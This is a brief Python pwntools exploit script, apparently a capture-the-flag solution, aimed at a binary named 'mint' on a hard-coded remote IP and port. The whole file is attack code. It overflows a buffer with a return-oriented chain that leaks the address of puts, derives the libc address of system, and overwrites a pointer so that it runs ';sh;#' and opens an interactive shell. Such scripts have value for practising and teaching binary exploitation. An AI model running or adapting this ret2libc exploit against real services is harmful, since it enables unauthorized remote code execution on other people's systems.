from pwn import *

elf = ELF('/=/Downloads/mint')
local = False
if local:
	HOST, PORT = '0.0.0.0', 31337
	libc = elf.libc
else:
	HOST, PORT = '139.59.61.220', 42345
	libc = ELF('/=/Downloads/libc-2.23 (1).so')
r = remote(HOST, PORT)
menu = lambda: r.recvuntil('option :')
print menu()
r.sendline('1')
r.sendline('a' * 48)
print menu()
r.sendline('2')
r.sendline('1')
r.sendline('a' * 4)
print menu()
r.sendline('2')
r.sendline('1')
r.sendline('a' * 0xf + p32(0x41414141) + p32(0x8048420) + p32(0x80483dd) + p32(0x804a018) + p32(0x804857b) + p32(0x8048420) + p32(0x804a018) + p32(0x7fffffff))
menu()
r.sendline('4')
puts = u32(r.recvline()[:4])
system = puts - libc.symbols['puts'] + libc.symbols['system']
print hex(puts)
print hex(system)
r.sendline(p32(system) * 2 + ';sh;#')
r.interactive()